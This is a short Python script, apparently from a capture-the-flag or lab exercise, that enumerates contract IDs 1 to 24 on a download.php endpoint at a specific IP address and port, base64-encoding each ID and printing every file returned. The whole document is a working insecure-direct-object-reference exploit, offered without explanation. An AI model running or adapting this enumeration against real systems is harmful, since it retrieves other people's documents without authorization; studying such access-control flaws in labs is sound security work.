
import base64 
import requests
import urllib


url = "http://165.227.225.205:31979/download.php?contract="


for i in range(1,25):
	parameter = base64.b64encode(str(i).encode()).decode()

	final_url = url + urllib.parse.quote_plus(parameter)

	r = requests.get(final_url)

	print(r.text)
